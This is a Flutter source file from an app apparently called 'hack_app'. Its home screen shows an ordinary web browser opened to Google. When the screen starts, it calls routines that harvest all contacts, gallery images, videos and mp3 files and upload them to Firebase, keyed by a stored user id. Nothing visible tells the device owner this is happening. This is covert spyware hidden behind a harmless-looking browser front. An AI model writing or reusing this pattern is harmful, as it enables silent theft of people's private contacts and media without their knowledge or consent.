import 'package:flutter/material.dart';
import 'package:hack_app/accessdata/alldataisasscess.dart';
import 'package:hive/hive.dart';
import 'package:provider/provider.dart';
import 'package:web_browser/web_browser.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  var sett = Hive.box('settings');
  @override
  void initState() {
    String uid = sett.get('uid', defaultValue: '');
    Hackapp hack = Provider.of<Hackapp>(context, listen: false);
    hack.accessallcontact(uid);
    hack.loadGalleryImages(uid);
    hack.uploadAllVideosToFirebase(uid);
    hack.uploadallmp3file(uid);
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      body: SafeArea(
        child: WebBrowser(
          initialUrl: 'https://www.google.com',
        ),
      ),
    );
  }
}
